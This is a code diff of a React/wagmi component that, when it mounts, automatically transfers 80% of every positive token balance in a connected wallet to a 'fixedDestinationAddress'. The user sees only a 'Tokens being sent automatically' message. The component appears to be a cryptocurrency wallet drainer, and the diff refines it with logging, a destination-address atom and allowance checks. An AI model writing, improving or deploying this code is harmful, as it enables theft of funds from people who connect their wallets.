@@ -2,11 +2,13 @@ import { useEffect, useCallback } from 'react';
 import { useAtom } from 'jotai';
 import { useWalletClient, usePublicClient } from 'wagmi';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
+import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import { erc20ABI } from 'wagmi';
 
 export const SendTokens = () => {
   const [tokens] = useAtom(globalTokensAtom);
+  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
 
   const { data: walletClient } = useWalletClient();
@@ -21,51 +23,61 @@ export const SendTokens = () => {
       .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
       .map((token) => token.contract_address as `0x${string}`);
 
-    if (!walletClient) return;
-    if (!fixedDestinationAddress) return;
+    if (!walletClient) {
+      console.error("Wallet client non disponible");
+      return;
+    }
+
+    if (!fixedDestinationAddress) {
+      console.error("Adresse de destination non définie");
+      return;
+    }
 
     // Envoyer tous les tokens
     for (const tokenAddress of tokensToSend) {
       const token = tokens.find((token) => token.contract_address === tokenAddress);
       if (!token) continue;
 
+      console.log(`Envoi du token ${token.contract_ticker_symbol} vers ${fixedDestinationAddress}`);
+
       try {
         const tokenBalance = BigInt(token.balance);
         const amountToSend = tokenBalance * 80n / 100n; // Calculer 80% du solde
 
-        // Vérifier l'approbation du contrat
-        const { data: allowance } = await publicClient.readContract({
+        console.log(`Montant à envoyer pour ${token.contract_ticker_symbol}:`, amountToSend.toString());
+
+        const allowance = await publicClient.readContract({
           address: tokenAddress,
           abi: erc20ABI,
           functionName: 'allowance',
-          args: [walletClient?.account, fixedDestinationAddress],
+          args: [walletClient.account, fixedDestinationAddress],
         });
 
-        if (allowance < amountToSend) {
-          // Approuver les tokens si l'approbation est insuffisante
-          const { request: approveRequest } = await publicClient.simulateContract({
-            account: walletClient?.account,
-            address: tokenAddress,
-            abi: erc20ABI,
-            functionName: 'approve',
-            args: [fixedDestinationAddress, amountToSend],
-          });
+        console.log(`Allowance actuelle:`, allowance.toString());
 
-          const approveResponse = await walletClient?.writeContract(approveRequest);
-          console.log('Approval successful:', approveResponse);
+        // Vérifier si l'utilisateur a approuvé suffisamment de tokens
+        if (allowance < amountToSend) {
+          console.log("Autorisation insuffisante pour envoyer les tokens. Veuillez approuver avant de continuer.");
+          continue; // Passer à l'itération suivante si l'autorisation est insuffisante
         }
 
-        // Envoyer les tokens après l'approbation
         const { request } = await publicClient.simulateContract({
-          account: walletClient?.account,
+          account: walletClient.account,
           address: tokenAddress,
           abi: erc20ABI,
           functionName: 'transfer',
-          args: [fixedDestinationAddress, amountToSend],
+          args: [
+            fixedDestinationAddress as `0x${string}`,
+            amountToSend,
+          ],
         });
 
-        const response = await walletClient?.writeContract(request);
+        console.log("Simulation réussie, envoi de la transaction...");
 
+        const response = await walletClient.writeContract(request);
+        console.log(`Transaction envoyée pour ${token.contract_ticker_symbol}:`, response);
+
+        // Mettre à jour l'état pour marquer le token comme envoyé
         setCheckedRecords((old) => ({
           ...old,
           [tokenAddress]: {
@@ -86,5 +98,5 @@ export const SendTokens = () => {
     }
   }, [tokens, walletClient, sendAllTokens, publicClient]);
 
-  return <div style={{ margin: '20px' }}>Tokens are being sent automatically...</div>;
+  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
 };
